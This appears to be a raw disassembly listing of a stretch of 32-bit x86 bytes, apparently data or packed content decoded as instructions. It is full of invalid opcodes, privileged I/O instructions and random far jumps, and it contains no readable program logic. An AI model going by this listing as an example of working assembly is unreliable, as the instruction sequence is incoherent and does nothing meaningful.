  41c97a:	add    al,0x77
  41c97c:	jl     0x41c956
  41c97e:	cmp    BYTE PTR [esp+ecx*1+0x4d8bbdc6],0x27
  41c986:	ret    
  41c987:	cs pop ecx
  41c989:	mov    al,ds:0x5e293ada
  41c98e:	dec    edx
  41c98f:	pop    ecx
  41c990:	cmp    DWORD PTR [eax],0xdcce4f4b
  41c996:	push   ss
  41c997:	(bad)  
  41c998:	pop    ebp
  41c999:	cmp    DWORD PTR [esi],edx
  41c99b:	ja     0x41c981
  41c99d:	lods   al,BYTE PTR ds:[esi]
  41c99e:	xor    bl,ch
  41c9a0:	pop    ds
  41c9a1:	xor    edx,DWORD PTR [esi]
  41c9a3:	sub    eax,0x841bfc5
  41c9a8:	add    eax,0x830c8e
  41c9ad:	lock push ds
  41c9af:	inc    esi
  41c9b0:	add    dl,BYTE PTR [ebp-0xe]
  41c9b3:	jle    0x41c9cf
  41c9b5:	mov    ebp,0x130566de
  41c9ba:	pop    ds
  41c9bb:	jp     0x41c973
  41c9bd:	test   DWORD PTR [eax],ecx
  41c9bf:	xchg   edi,eax
  41c9c0:	mov    esi,0x7f5082e4
  41c9c5:	cmp    eax,0x7a00ea86
  41c9ca:	xchg   al,al
  41c9cc:	hlt    
  41c9cd:	and    al,0x47
  41c9cf:	fiadd  WORD PTR [edi-0x281f82ec]
  41c9d5:	add    BYTE PTR [esi+0x3c],cl
  41c9d8:	xor    eax,DWORD PTR [ebp-0x5b]
  41c9db:	lds    eax,FWORD PTR [ebx]
  41c9dd:	mov    esi,0x350daf89
  41c9e2:	jle    0x41c9e0
  41c9e4:	inc    esp
  41c9e5:	cmp    BYTE PTR [eax-0x51],0xe0
  41c9e9:	outs   dx,BYTE PTR ds:[esi]
  41c9ea:	out    dx,eax
  41c9eb:	jne    0x41ca52
  41c9ed:	xor    eax,0xafe2fd16
  41c9f2:	in     eax,dx
  41c9f3:	push   esp
  41c9f4:	fisub  WORD PTR [ebx+ebp*1-0x6275f189]
  41c9fb:	loopne 0x41ca76
  41c9fd:	fs jge 0x41ca0e
  41ca00:	leave  
  41ca01:	sbb    eax,0x7901d2f9
  41ca06:	test   eax,0xb6eceb65
  41ca0b:	popf   
  41ca0c:	mov    DWORD PTR [ebx-0x5a067d32],ebx
  41ca12:	sti    
  41ca13:	sahf   
  41ca14:	in     al,0x37
  41ca16:	mov    eax,ds:0x61fb31c2
  41ca1b:	push   es
  41ca1c:	(bad)  
  41ca1d:	leave  
  41ca1e:	stc    
  41ca1f:	nop
  41ca20:	dec    edi
  41ca21:	ficom  WORD PTR [edx+0x314f7254]
  41ca27:	scas   eax,DWORD PTR es:[edi]
  41ca28:	sbb    BYTE PTR [ebp+0x10d92ca3],bh
  41ca2e:	push   esp
  41ca2f:	sub    al,0xf
  41ca31:	imul   ecx,DWORD PTR [ebx-0x16],0xffffffa9
  41ca35:	jno    0x41ca55
  41ca37:	push   0x38
  41ca39:	in     al,0xb9
  41ca3b:	fnstcw WORD PTR [edx*4-0x4bd75cec]
  41ca42:	cmc    
  41ca43:	or     al,0x3a
  41ca45:	mov    dl,0x7d
  41ca47:	loop   0x41caac
  41ca49:	mov    ch,0x5b
  41ca4b:	xor    ch,cl
  41ca4d:	xchg   edx,eax
  41ca4e:	scas   eax,DWORD PTR es:[edi]
  41ca4f:	dec    ebp
  41ca50:	in     al,0x66
  41ca52:	mov    ds:0x42e4aed2,al
  41ca57:	aas    
  41ca58:	mov    DWORD PTR [edx-0x1e],ebp
  41ca5b:	(bad)  
  41ca5c:	fist   DWORD PTR [ecx-0x55]
  41ca5f:	mov    bh,0xca
  41ca61:	and    eax,0x9530515b
  41ca66:	mov    ebp,0xc5ccc228
  41ca6b:	loopne 0x41ca78
  41ca6d:	out    0x2e,eax
  41ca6f:	add    al,BYTE PTR [eax-0x8]
  41ca72:	(bad)  
  41ca73:	jp     0x41cabc
  41ca75:	add    al,0xe2
  41ca77:	clc    
  41ca78:	jno    0x41ca56
  41ca7a:	test   dl,bl
  41ca7c:	aad    0xff
  41ca7e:	imul   esi,DWORD PTR [ebx+0x33],0xffffffd6
  41ca82:	mov    eax,ds:0xdfc4e782
  41ca87:	cmp    DWORD PTR [ebp+0x2c],ebx
  41ca8a:	push   ebx
  41ca8b:	call   0x974a:0xc8918441
  41ca92:	lods   eax,DWORD PTR ds:[esi]
  41ca93:	test   ebx,edx
  41ca95:	(bad)  
  41ca96:	mov    es,WORD PTR [ebx-0x61]
  41ca99:	(bad)  
  41ca9a:	shr    BYTE PTR [edx+0x2e],0x7a
  41ca9e:	stc    
  41ca9f:	jmp    0x41cade
  41caa1:	mov    ds:0x24fdb9f8,al
  41caa6:	shl    edi,cl
  41caa8:	cmp    DWORD PTR [edi-0x39],0xc098ed44
  41caaf:	stc    
  41cab0:	mov    al,0x53
  41cab2:	jno    0x41cb29
  41cab4:	xchg   edi,eax
  41cab5:	in     eax,dx
  41cab6:	(bad)  [esi+0x8]
  41cab9:	in     al,0x6e
  41cabb:	xor    bh,ah
  41cabd:	sahf   
  41cabe:	dec    ebx
  41cabf:	xchg   ebx,eax
  41cac0:	pop    ebp
  41cac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cac2:	dec    edx
  41cac3:	leave  
  41cac4:	and    dl,bl
  41cac6:	sub    edx,DWORD PTR ds:0x20d1b348
  41cacc:	push   ecx
  41cacd:	inc    ecx
  41cace:	cmp    BYTE PTR [ebx+0x6d7bf6ba],bh
  41cad4:	ins    BYTE PTR es:[edi],dx
  41cad5:	pop    ebx
  41cad6:	stc    
  41cad7:	lea    edi,[eax+0x55]
  41cada:	fstp   QWORD PTR [ebx-0x8864ae1]
  41cae0:	add    al,0xc6
  41cae2:	test   eax,0xd0ea8b70
  41cae7:	push   esp
  41cae8:	adc    ah,BYTE PTR [edx]
  41caea:	inc    edx
  41caeb:	cmp    al,0x73
  41caed:	scas   eax,DWORD PTR es:[edi]
  41caee:	push   0xf9e5f7fb
  41caf3:	adc    al,0x7a
  41caf5:	dec    eax
  41caf6:	pop    eax
  41caf7:	sbb    BYTE PTR [eax],cl
  41caf9:	jbe    0x41cb72
  41cafb:	mov    esp,DWORD PTR [edi-0x3b1fa373]
  41cb01:	stos   BYTE PTR es:[edi],al
  41cb02:	sbb    BYTE PTR [ebx-0x3a],0xd
  41cb06:	push   ss
  41cb07:	and    BYTE PTR ds:0x40a2dcc7,dh
  41cb0d:	cmp    ecx,DWORD PTR [ecx-0x3fc74a71]
  41cb13:	ror    DWORD PTR [ebx+0x700f5e02],1
  41cb19:	inc    ecx
  41cb1a:	pop    eax
  41cb1b:	add    BYTE PTR [edi-0x7df36cb6],bl
  41cb21:	outs   dx,DWORD PTR ds:[esi]
  41cb22:	ins    DWORD PTR es:[edi],dx
  41cb23:	aaa    
  41cb24:	jmp    0x41cadc
  41cb26:	iret   
  41cb27:	jb     0x41cb71
  41cb29:	mov    eax,0x37b88b42
  41cb2e:	mov    ebp,0x1f3190f8
  41cb33:	adc    al,0xcf
  41cb35:	lds    esp,FWORD PTR [eiz*4+0x6ad82970]
  41cb3c:	adc    al,0xd1
  41cb3e:	mov    bh,0x40
  41cb40:	adc    al,0xb2
  41cb42:	mov    edx,0x511607d7
  41cb47:	out    dx,eax
  41cb48:	add    ebx,DWORD PTR [ebp+0x5e]
  41cb4b:	jmp    0x7ddbf6d9
  41cb50:	dec    edx
  41cb51:	fucomp st(1)
  41cb53:	imul   eax,DWORD PTR [eax-0x2551c9f2],0x8866df39
  41cb5d:	and    DWORD PTR [edi],esi
  41cb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb60:	sub    dh,BYTE PTR [eax+0x4c8ab8e4]
  41cb66:	daa    
  41cb67:	sahf   
  41cb68:	adc    DWORD PTR [edi+0x7889ebfb],edx
  41cb6e:	js     0x41cbe2
  41cb70:	cli    
  41cb71:	dec    ecx
  41cb72:	sbb    DWORD PTR [edi+ebp*4+0x52],edx
  41cb76:	inc    edi
  41cb77:	daa    
  41cb78:	push   cs
  41cb79:	mov    edi,DWORD PTR [ebx-0x7f]
  41cb7c:	fdiv   QWORD PTR [edi+0x1a]
  41cb7f:	mov    bl,0x9
  41cb81:	adc    ebx,DWORD PTR [esi]
  41cb83:	pop    edx
  41cb84:	(bad)  
  41cb85:	cmp    al,0x6c
  41cb87:	nop    eax
  41cb8a:	loopne 0x41cb4b
  41cb8c:	ds dec ebx
  41cb8e:	ds ds and ch,cl
  41cb92:	jle    0x41cb5b
  41cb94:	iret   
  41cb95:	enter  0x73a2,0xdc
  41cb99:	jmp    0x3e55:0x73bf2e2
  41cba0:	fdivr  DWORD PTR [eax+0x62]
  41cba3:	sbb    al,0xb2
  41cba5:	ds pop edx
  41cba7:	pop    edi
  41cba8:	mov    edx,0x8245791b
  41cbad:	int    0x14
  41cbaf:	inc    ebp
  41cbb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb1:	mov    dh,0xc1
  41cbb3:	outs   dx,DWORD PTR ds:[esi]
  41cbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb5:	ds mov edx,0xb5612327
  41cbbb:	imul   eax,DWORD PTR [esi],0xdd4d29b3
  41cbc1:	popa   
  41cbc2:	or     eax,0x12c43d40
  41cbc7:	push   ss
  41cbc8:	clc    
  41cbc9:	and    al,bl
  41cbcb:	xlat   BYTE PTR ds:[ebx]
  41cbcc:	mov    esp,edi
  41cbce:	xor    ah,bl
  41cbd0:	xor    dl,BYTE PTR [edi+0x3659b75b]
  41cbd6:	repz jecxz 0x41cbd1
  41cbd9:	loope  0x41cc1b
  41cbdb:	(bad)  
  41cbdc:	fsubr  DWORD PTR [ecx]
  41cbde:	sti    
  41cbdf:	mov    ah,0x67
  41cbe1:	sub    BYTE PTR [edi+edx*2-0x62],al
  41cbe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbe6:	dec    esi
  41cbe7:	(bad)  
  41cbe8:	mov    edx,0x1ac1af06
  41cbed:	or     al,0xc9
  41cbef:	out    dx,al
  41cbf0:	retf   
  41cbf1:	lea    ebp,[eax+0x245e38c0]
  41cbf7:	sbb    eax,DWORD PTR [edx+0x6c]
  41cbfa:	fs popf 
  41cbfc:	idiv   BYTE PTR [edx-0x31]
  41cbff:	adc    ebx,DWORD PTR es:[ecx+0x30]
  41cc03:	sbb    eax,0xc6a3684a
  41cc08:	pop    edx
  41cc09:	(bad)  
  41cc0a:	inc    edx
  41cc0b:	dec    esi
  41cc0c:	aaa    
  41cc0d:	pop    ss
  41cc0e:	fidivr WORD PTR ds:[edx+esi*2+0x4a420c0f]
  41cc16:	nop
  41cc17:	and    esi,DWORD PTR ds:[ecx]
  41cc1a:	dec    esi
  41cc1b:	imul   ebp,DWORD PTR [edx+0x42],0x3e298bdf
  41cc22:	mov    fs,ecx
  41cc24:	mov    al,0x51
  41cc26:	xchg   edx,eax
  41cc27:	int3   
  41cc28:	sbb    al,0xfa
  41cc2a:	mov    dh,0xc7
  41cc2c:	xor    ch,BYTE PTR cs:[eax-0x3c]
  41cc30:	mov    BYTE PTR [eax],dh
  41cc32:	sar    DWORD PTR [edx],1
  41cc34:	add    al,0xe0
  41cc36:	enter  0x17ba,0xf8
  41cc3a:	in     eax,0x65
  41cc3c:	adc    eax,0xc632d8ac
  41cc41:	mov    eax,0xa5460adb
  41cc46:	into   
  41cc47:	fwait
  41cc48:	ret    0x2453
  41cc4b:	out    dx,al
  41cc4c:	stos   DWORD PTR es:[edi],eax
  41cc4d:	mov    bl,0xe4
  41cc4f:	out    dx,al
  41cc50:	addr16 (bad) 
  41cc52:	test   BYTE PTR [ebx+0x6b],0xb5
  41cc56:	arpl   ax,dx
  41cc58:	repnz sbb al,0xc3
  41cc5b:	push   ecx
  41cc5c:	push   es
  41cc5d:	pop    eax
  41cc5e:	retf   
  41cc5f:	cli    
  41cc60:	mov    ?,ecx
  41cc62:	int    0xc7
  41cc64:	bndldx bnd1,ds:0x5709b87d
  41cc6b:	sub    BYTE PTR [ecx-0x4ae97b5b],dl
  41cc71:	cmp    dl,dl
  41cc73:	shl    BYTE PTR [edi],cl
  41cc75:	jge    0x41cc2c
  41cc77:	adc    bh,BYTE PTR [edi+0x7aa0bf95]
  41cc7d:	out    0xb5,al
  41cc7f:	pop    edi
  41cc80:	xor    bl,BYTE PTR [ebp+0x3e]
  41cc83:	sbb    esp,DWORD PTR [ebx+0x71]
  41cc86:	fdiv   st(7),st
  41cc88:	or     ebx,DWORD PTR [edx+0x30df7ba8]
  41cc8e:	retf   0x61a3
  41cc91:	mov    esp,cs
  41cc93:	repnz dec ebx
  41cc95:	les    esi,FWORD PTR [esi+0x39b96357]
  41cc9b:	lods   al,BYTE PTR ds:[esi]
  41cc9c:	push   ds
  41cc9d:	mov    ch,0x1e
  41cc9f:	daa    
  41cca0:	and    DWORD PTR [eax],ebp
  41cca2:	shr    BYTE PTR [eax],cl
  41cca4:	add    al,0x17
  41cca6:	mov    al,0xf4
  41cca8:	adc    al,0x4b
  41ccaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccab:	mov    bh,0x5c
  41ccad:	push   0xffffffab
  41ccaf:	aam    0xaf
  41ccb1:	dec    esp
  41ccb2:	shr    BYTE PTR [ecx-0x37cad8d5],1
  41ccb8:	retf   0xa2b1
  41ccbb:	jbe    0x41cd07
  41ccbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccbe:	cmc    
  41ccbf:	ins    DWORD PTR es:[edi],dx
  41ccc0:	or     al,BYTE PTR [esi+eiz*2+0x2b4ee29e]
  41ccc7:	mov    BYTE PTR [ecx],0x5f
  41ccca:	(bad)  
  41cccc:	ror    DWORD PTR [eax],cl
  41ccce:	push   edx
  41cccf:	xor    DWORD PTR [eax+0xc2cad3],0x8f04bf45
  41ccd9:	nop
  41ccda:	imul   esi,DWORD PTR [esi+0x4f843bc2],0xfffffff7
  41cce1:	call   0xd61fb45c
  41cce6:	clc    
  41cce7:	mov    esi,DWORD PTR ds:0x8db1c544
  41cced:	stos   DWORD PTR es:[edi],eax
  41ccee:	xchg   DWORD PTR [edi],edi
  41ccf0:	aaa    
  41ccf1:	mov    ebx,0x6039e52b
  41ccf6:	ins    BYTE PTR es:[edi],dx
  41ccf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccf8:	test   DWORD PTR [edx+0xc3c244c],0x3cae9dc
  41cd02:	add    BYTE PTR [eax],al
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xb07bb7f0
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x65201818],bh
  41cd1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd1f:	das    
  41cd20:	push   DWORD PTR ds:0xefa84cd3
  41cd26:	outs   dx,DWORD PTR ds:[esi]
  41cd27:	popf   
  41cd28:	fld    st(1)
  41cd2a:	gs loop 0x41cd9f
  41cd2d:	sbb    al,0x76
  41cd2f:	out    0x9f,al
  41cd31:	fmul   QWORD PTR [eax+0x45]
  41cd34:	mov    bl,0x44
  41cd36:	hlt    
  41cd37:	ficom  WORD PTR [eax]
  41cd39:	(bad)  
  41cd3a:	retf   0xcba5
  41cd3d:	imul   ebx,edx,0x64546d32
  41cd43:	add    al,0x18
  41cd45:	inc    eax
  41cd46:	in     al,dx
  41cd47:	pop    es
  41cd48:	icebp  
  41cd49:	sti    
  41cd4a:	hlt    
  41cd4b:	cmc    
  41cd4c:	in     al,dx
  41cd4d:	loopne 0x41ccdc
  41cd4f:	mov    ebx,0x39b61a93
  41cd54:	dec    ebp
  41cd55:	pushf  
  41cd56:	pop    ss
  41cd57:	pop    ebx
  41cd58:	shl    BYTE PTR [ebp-0x53],1
  41cd5b:	cmp    edi,DWORD PTR [esi+0x3f4c9888]
  41cd61:	jns    0x41cd8c
  41cd63:	xchg   esi,eax
  41cd64:	popf   
  41cd65:	gs xchg ebp,eax
  41cd67:	adc    edi,DWORD PTR [ecx-0x79]
  41cd6a:	mov    ch,dh
  41cd6c:	mov    eax,ds:0xb2f8551b
  41cd71:	clc    
  41cd72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd73:	call   0xe1205b22
  41cd78:	add    bh,BYTE PTR [edx]
  41cd7a:	loopne 0x41cd99
  41cd7c:	test   DWORD PTR ds:0xe908fde4,edx
  41cd82:	cmp    esi,DWORD PTR [edx]
  41cd84:	cmp    BYTE PTR ds:0xb8c1b35d,bl
  41cd8a:	cmc    
  41cd8b:	dec    BYTE PTR [ebx]
  41cd8d:	jae    0x41cd34
  41cd8f:	je     0x41cd29
  41cd91:	scas   eax,DWORD PTR es:[edi]
  41cd92:	pop    esi
  41cd93:	cwde   
  41cd94:	pop    ebp
  41cd95:	xor    DWORD PTR [edx+0x791f9aec],eax
  41cd9b:	mov    esp,0xfd13cc49
  41cda0:	xor    esi,DWORD PTR [ecx-0x57]
  41cda3:	inc    ebp
  41cda4:	dec    edx
  41cda5:	popa   
  41cda6:	rcr    BYTE PTR [ebp-0x79],0x98
  41cdaa:	adc    ch,BYTE PTR [ebp-0x22c5a3c]
  41cdb0:	adc    BYTE PTR [edi+0x5df84c96],0x5b
  41cdb7:	stc    
  41cdb8:	sahf   
  41cdb9:	pusha  
  41cdba:	or     bl,BYTE PTR ds:0x17fef5a3
  41cdc0:	hlt    
  41cdc1:	jno    0x41cda5
  41cdc3:	(bad)  
  41cdc4:	std    
  41cdc5:	outs   dx,DWORD PTR ds:[esi]
  41cdc6:	jg     0x41ce27
  41cdc8:	xlat   BYTE PTR ds:[ebx]
  41cdc9:	mov    dl,0xd2
  41cdcb:	cmp    al,0x11
  41cdcd:	leave  
  41cdce:	jne    0x41cd75
  41cdd0:	cmc    
  41cdd1:	and    edx,esp
  41cdd3:	pop    ss
  41cdd4:	sub    dh,ch
  41cdd6:	add    DWORD PTR [esi+eax*2],eax
  41cdd9:	leave  
  41cdda:	aaa    
  41cddb:	(bad)  
  41cddc:	mov    ebx,0xaf125309
  41cde1:	sub    eax,0xfbbd1f55
  41cde6:	xor    edx,DWORD PTR [edx]
  41cde8:	push   edx
  41cde9:	inc    esi
  41cdea:	gs push ebp
  41cdec:	jmp    0xa3c5:0xac85fbe
  41cdf3:	push   cs
  41cdf4:	add    DWORD PTR [ecx-0x7c],ecx
  41cdf7:	call   0xd003a144
  41cdfc:	sahf   
  41cdfd:	std    
  41cdfe:	add    BYTE PTR [eax+0xcdefc7e],bl
  41ce04:	int    0x49
  41ce06:	xchg   DWORD PTR [eax+eax*4],edx
  41ce09:	pop    edx
  41ce0a:	jbe    0x41ce55
  41ce0c:	adc    al,0xfc
  41ce0e:	xlat   BYTE PTR ds:[ebx]
  41ce0f:	push   ss
  41ce10:	dec    esi
  41ce11:	pop    edx
  41ce12:	(bad)  
  41ce13:	jg     0x41ce17
  41ce15:	sbb    esi,DWORD PTR [esi]
  41ce17:	in     al,0xa1
  41ce19:	and    al,0xe8
  41ce1b:	in     eax,0x75
  41ce1d:	or     al,0x4d
  41ce1f:	dec    esp
  41ce20:	fmul   QWORD PTR [edx-0xe]
  41ce23:	scas   eax,DWORD PTR es:[edi]
  41ce24:	(bad)  
  41ce25:	in     al,0x42
  41ce27:	std    
  41ce28:	mov    ah,0x45
  41ce2a:	hlt    
  41ce2b:	inc    eax
  41ce2c:	ins    BYTE PTR es:[edi],dx
  41ce2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce2e:	or     al,0x8e
  41ce30:	ja     0x41ce81
  41ce32:	jns    0x41ce14
  41ce34:	jmp    0x41ce80
  41ce36:	sub    ah,al
  41ce38:	sbb    al,0xf2
  41ce3a:	(bad)  
  41ce3b:	mov    esp,0x2eeeda50
  41ce40:	or     bl,dl
  41ce42:	icebp  
  41ce43:	popa   
  41ce44:	test   al,0x60
  41ce46:	pop    esp
  41ce47:	jmp    0x41ce7e
  41ce49:	ja     0x41ce67
  41ce4b:	cmp    al,0x7b
  41ce4d:	pop    ds
  41ce4e:	jo     0x41ce31
  41ce50:	adc    eax,eax
  41ce52:	push   ss
  41ce53:	loop   0x41ce1c
  41ce55:	dec    esp
  41ce56:	inc    esp
  41ce57:	repnz cmp eax,DWORD PTR [ecx+0x4d]
  41ce5b:	cdq    
  41ce5c:	mul    edx
  41ce5e:	mov    esp,0x26695055
  41ce63:	loopne 0x41ce32
  41ce65:	xlat   BYTE PTR ds:[ebx]
  41ce66:	or     eax,0xa5e665a5
  41ce6b:	stos   BYTE PTR es:[edi],al
  41ce6c:	and    dl,dl
  41ce6e:	shl    BYTE PTR [edx],1
  41ce70:	in     al,0x67
  41ce72:	mov    ebx,0x88d559fa
  41ce77:	mov    eax,ds:0xf2d26868
  41ce7c:	inc    ecx
  41ce7d:	or     edi,DWORD PTR [edi-0x11]
  41ce80:	mov    eax,0x7d911685
  41ce85:	fdivr  DWORD PTR [edx+0x92d2b96]
  41ce8b:	mov    edi,0x807ecfe
  41ce90:	inc    eax
  41ce91:	adc    eax,DWORD PTR [ebx-0x1f]
  41ce94:	xchg   esi,eax
  41ce95:	inc    edx
  41ce96:	enter  0x68fb,0xb4
  41ce9a:	mov    edx,0xcf5925c8
  41ce9f:	push   edx
  41cea0:	call   0x13c8:0x2e7e3e7b
  41cea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cea8:	ins    BYTE PTR es:[edi],dx
  41cea9:	stc    
  41ceaa:	fwait
  41ceab:	enter  0xa839,0x65
  41ceaf:	add    ebx,DWORD PTR [edx+0x45f025c8]
  41ceb5:	enter  0xede2,0xd0
  41ceb9:	jo     0x41cea4
  41cebb:	lds    ebp,FWORD PTR [edx+0x0]
  41cebe:	clc    
  41cebf:	cs xchg edx,eax
  41cec1:	and    al,0x80
  41cec3:	push   edi
  41cec4:	xor    al,0x62
  41cec6:	sbb    ah,ah
  41cec8:	mov    dl,0xe1
  41ceca:	and    eax,DWORD PTR [ebp-0x5f]
  41cecd:	and    ah,BYTE PTR [edx+eax*8-0x4e]
  41ced1:	xchg   edx,eax
  41ced2:	fsubr  QWORD PTR [ecx]
  41ced4:	pop    es
  41ced5:	mov    al,0xed
  41ced7:	dec    edx
  41ced8:	out    0xfd,al
  41ceda:	ds cmp al,0x8b
  41cedd:	add    eax,0x2d3dee3c
  41cee2:	jnp    0x41cef3
  41cee4:	jle    0x41cee6
  41cee6:	jmp    0x41cf4e
  41cee8:	fldenv [eax]
  41ceea:	into   
  41ceeb:	clc    
  41ceec:	(bad)  
  41ceee:	pop    esp
  41ceef:	mov    fs,WORD PTR [esi]
  41cef1:	mov    bh,0xc6
  41cef3:	out    dx,eax
  41cef4:	sbb    eax,0x161200ce
  41cef9:	sbb    eax,0x3943a5a6
  41cefe:	or     esi,DWORD PTR [edi-0x4b3f672f]
  41cf04:	inc    eax
  41cf05:	inc    edx
  41cf06:	sub    BYTE PTR [edx],dh
  41cf08:	fisttp QWORD PTR [edi+0x146feda9]
  41cf0e:	ret    0x2f2a
  41cf11:	adc    BYTE PTR [esi],0x86
  41cf14:	stos   DWORD PTR es:[edi],eax
  41cf15:	into   
  41cf16:	in     al,dx
  41cf17:	and    ah,BYTE PTR [ebx+0x0]
  41cf1a:	jnp    0x41cf43
  41cf1c:	(bad)  
  41cf1d:	xchg   ebp,eax
  41cf1e:	mov    eax,0x62b34b6a
  41cf23:	xchg   esp,eax
  41cf24:	cwde   
  41cf25:	dec    ecx
  41cf26:	add    DWORD PTR [edi],edi
  41cf28:	cld    
  41cf29:	dec    edx
  41cf2a:	loope  0x41cf47
  41cf2c:	pop    es
  41cf2d:	ffreep st(5)
  41cf2f:	mov    dh,0x5d
  41cf31:	mov    BYTE PTR [ebp+0x7],cl
  41cf34:	mov    eax,0xd383c17b
  41cf39:	mov    DWORD PTR [eax],ecx
  41cf3b:	shl    BYTE PTR [edi],0x18
  41cf3e:	pop    esi
  41cf3f:	repnz stos BYTE PTR es:[edi],al
  41cf41:	jle    0x41cfa6
  41cf43:	imul   ebx,DWORD PTR [edx],0x3e828655
  41cf49:	call   0x132b:0xa52614e4
  41cf50:	sahf   
  41cf51:	in     eax,dx
  41cf52:	into   
  41cf53:	in     al,dx
  41cf54:	pop    ecx
  41cf55:	aad    0xf0
  41cf57:	push   esp
  41cf58:	xchg   edi,eax
  41cf59:	cli    
  41cf5a:	test   eax,0xd4a1121
  41cf5f:	fnsave [esi]
  41cf61:	inc    esp
  41cf62:	push   edx
  41cf63:	aad    0x7
  41cf65:	and    dl,BYTE PTR [edi-0x30]
  41cf68:	fisttp WORD PTR [ebp+0x5f8e3f1d]
  41cf6e:	or     edx,DWORD PTR [esi+0x27ac48ca]
  41cf74:	int3   
  41cf75:	mov    cs,WORD PTR [edi+eax*8-0x70]
  41cf79:	cld    
  41cf7a:	lds    ebp,FWORD PTR [ecx-0x6a]
  41cf7d:	in     al,0x3
  41cf7f:	xchg   ecx,eax
  41cf80:	shr    ecx,0xe4
  41cf83:	jmp    0x538b:0x67ce9349
  41cf8a:	and    ch,cl
  41cf8c:	inc    edx
  41cf8d:	xor    BYTE PTR [ecx],ah
  41cf8f:	in     eax,dx
  41cf90:	test   DWORD PTR [edi-0x57],0xc0cf6417
  41cf97:	aad    0x11
  41cf99:	add    bh,BYTE PTR [edi]
  41cf9b:	in     al,dx
  41cf9c:	aaa    
  41cf9d:	xchg   edx,eax
  41cf9e:	pop    edi
  41cf9f:	mov    WORD PTR ds:0x2c7934f8,cs
  41cfa5:	cmp    esi,ecx
  41cfa7:	or     DWORD PTR [edx+0x61],edi
  41cfaa:	cmp    eax,0x79f655f7
  41cfaf:	int    0x8b
  41cfb1:	outs   dx,DWORD PTR ds:[esi]
  41cfb2:	jmp    0xe6e8:0x3dfe47ba
  41cfb9:	xor    bl,BYTE PTR [eax-0x7d]
  41cfbc:	xchg   ebx,eax
  41cfbd:	cmp    dh,al
  41cfbf:	jbe    0x41cf94
  41cfc1:	out    dx,eax
  41cfc2:	jle    0x41d00f
  41cfc4:	icebp  
  41cfc5:	mov    eax,0x7f67346c
  41cfca:	std    
  41cfcb:	push   ebx
  41cfcc:	mov    eax,ds:0xcc19b85c
  41cfd1:	cmp    DWORD PTR [eax],0xe9b1a53c
  41cfd7:	jge    0x41d044
  41cfd9:	int3   
  41cfda:	aad    0x1a
  41cfdc:	add    bh,BYTE PTR [ebx]
  41cfde:	mov    gs,WORD PTR cs:[edi]
  41cfe1:	add    BYTE PTR [eax+0xb],al
  41cfe4:	out    0x9f,eax
  41cfe6:	into   
  41cfe7:	pop    esp
  41cfe8:	fdivr  QWORD PTR [edx+edx*8+0x3e]
  41cfec:	pop    ds
  41cfed:	jae    0x41d052
  41cfef:	cli    
  41cff0:	push   es
  41cff1:	imul   edi,DWORD PTR [ebp+0x71],0x21406401
  41cff8:	inc    ebx
  41cffa:	push   0x6e0d19e2
  41cfff:	sbb    BYTE PTR [edi+0x71],0x84
  41d003:	jns    0x41d01a
  41d005:	aaa    
  41d006:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d007:	lock in eax,0xdc
  41d00a:	outs   dx,DWORD PTR ds:[esi]
  41d00b:	in     al,dx
  41d00c:	mov    DWORD PTR ds:0xd2635bd3,esp
  41d012:	in     eax,0xec
  41d014:	leave  
  41d015:	inc    eax
  41d016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d017:	mov    al,ds:0x61c05b15
  41d01c:	dec    ebx
  41d01d:	(bad)  
  41d01e:	in     eax,dx
  41d01f:	inc    edx
  41d020:	jmp    0xd270:0x140b70e3
  41d027:	nop
  41d028:	arpl   WORD PTR [eax-0x3],bp
  41d02b:	sbb    bh,dl
  41d02d:	pop    edi
  41d02e:	mov    eax,ds:0xd8b7374b
  41d033:	xor    DWORD PTR [ebx],0xf041e8ab
  41d039:	test   eax,0xb1e23821
  41d03e:	repnz int3 
  41d040:	retf   0xa6b8
  41d043:	not    BYTE PTR [eax]
  41d045:	adc    ah,BYTE PTR [ecx+0x4b]
  41d048:	xchg   esp,eax
  41d049:	cld    
  41d04a:	mov    esi,0x1a6fc79b
  41d04f:	cmp    cl,BYTE PTR [esi+0x78ca63ee]
  41d055:	pop    ecx
  41d056:	push   ds
  41d057:	ret    
  41d058:	push   ebx
  41d059:	nop
  41d05a:	jle    0x41cfff
  41d05c:	push   ebp
  41d05d:	and    esi,edx
  41d05f:	xchg   ecx,eax
  41d060:	repnz loope 0x41d092
  41d063:	jle    0x41d078
  41d065:	out    0x72,eax
  41d067:	mov    ah,0xca
  41d069:	out    0x99,al
  41d06b:	aaa    
  41d06c:	or     BYTE PTR [eax+0x30e92766],dl
  41d072:	(bad)  
  41d073:	dec    edx
  41d074:	add    ah,BYTE PTR [esi-0x7b]
  41d077:	mov    ch,BYTE PTR ds:0xa13bedf0
  41d07d:	call   DWORD PTR [edx+0x808f3c1]
  41d083:	sub    bl,ah
  41d085:	sar    DWORD PTR [eax-0x72],0xfe
  41d089:	sti    
  41d08a:	push   esp
  41d08b:	into   
  41d08c:	call   0xe811:0xf8eef7f7
  41d093:	inc    DWORD PTR [ebp+0x7ecf61e0]
  41d099:	mov    ds:0xc0044765,eax
  41d09e:	sbb    edi,DWORD PTR [esi+0x1c]
  41d0a1:	scas   al,BYTE PTR es:[edi]
  41d0a2:	and    BYTE PTR [esi],0x40
  41d0a5:	push   edi
  41d0a6:	or     ebx,DWORD PTR [ecx+0x6609fcf8]
